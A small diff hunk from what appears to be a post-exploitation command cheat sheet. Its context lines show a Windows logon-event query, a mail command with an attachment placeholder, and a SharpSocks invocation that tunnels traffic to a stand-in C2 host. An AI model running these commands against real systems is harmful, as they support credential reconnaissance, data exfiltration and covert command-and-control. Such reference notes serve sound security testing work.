@@ -353,4 +353,3 @@ Get-Eventlog -newest 10000 -instanceid 4624 -logname security | select message -
 Send-MailMessage -to "itdept@test.com" -from "User01 <user01@example.com>" -subject <> -smtpServer <> -Attachment <>
 
 SharpSocks -Uri http://www.c2.com:9090 -Beacon 2000 -Insecure
-
